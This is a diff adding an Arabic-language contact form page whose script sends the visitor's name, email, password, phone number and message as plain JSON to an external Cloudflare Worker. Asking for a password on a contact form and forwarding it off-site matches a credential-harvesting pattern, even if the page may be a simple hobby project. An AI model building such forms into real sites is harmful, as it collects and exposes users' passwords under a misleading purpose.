@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>تواصل معنا</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<div class="logo">
+				<h1>تواصل معنا</h1>
+			</div>
+			<form class="form" id="contactForm">
+				<div class="input_field">
+					<input type="text" id="name" name="name" placeholder="الاسم الكامل" class="input" required>
+				</div>
+				<div class="input_field">
+					<input type="email" id="email" name="email" placeholder="البريد الإلكتروني" class="input" required>
+				</div>
+				<div class="input_field">
+					<input type="password" id="password" name="password" placeholder="كلمة السر " class="input" required>
+				</div>
+				<div class="input_field">
+					<input type="tel" id="phone" name="phone" placeholder="رقم الهاتف" class="input" required>
+				</div>
+				<div class="input_field">
+					<textarea id="message" name="message" placeholder="رسالتك" class="input" rows="4" required></textarea>
+				</div>
+				<button type="submit" class="btn" id="submitBtn">إرسال</button>
+				<div class="status" id="status"></div>
+			</form>
+		</div>
+	</div>
+	<div class="footer">
+		© 2026 جميع الحقوق محفوظة
+	</div>
+</div>
+
+<script>
+	// عنوان الـ Cloudflare Worker (الباك-إند)
+	const WORKER_URL = "https://nameless-hill-13e5.3aboodrealmadrid.workers.dev";
+
+	const form = document.getElementById("contactForm");
+	const statusEl = document.getElementById("status");
+	const submitBtn = document.getElementById("submitBtn");
+
+	form.addEventListener("submit", async function (e) {
+		e.preventDefault();
+
+		const data = {
+			name: document.getElementById("name").value.trim(),
+			email: document.getElementById("email").value.trim(),
+			password: document.getElementById("password").value.trim(),
+			phone: document.getElementById("phone").value.trim(),
+			message: document.getElementById("message").value.trim(),
+		};
+
+		submitBtn.disabled = true;
+		submitBtn.textContent = "جارِ الإرسال...";
+		statusEl.textContent = "";
+		statusEl.className = "status";
+
+		try {
+			const response = await fetch(WORKER_URL, {
+				method: "POST",
+				headers: { "Content-Type": "application/json" },
+				body: JSON.stringify(data),
+			});
+
+			if (!response.ok) throw new Error("فشل الإرسال");
+
+			statusEl.textContent = "تم إرسال رسالتك بنجاح ✅";
+			statusEl.className = "status success";
+			form.reset();
+		} catch (err) {
+			statusEl.textContent = "صار في خطأ، حاول مرة تانية.";
+			statusEl.className = "status error";
+		} finally {
+			submitBtn.disabled = false;
+			submitBtn.textContent = "إرسال";
+		}
+	});
+</script>
+</body>
+</html>
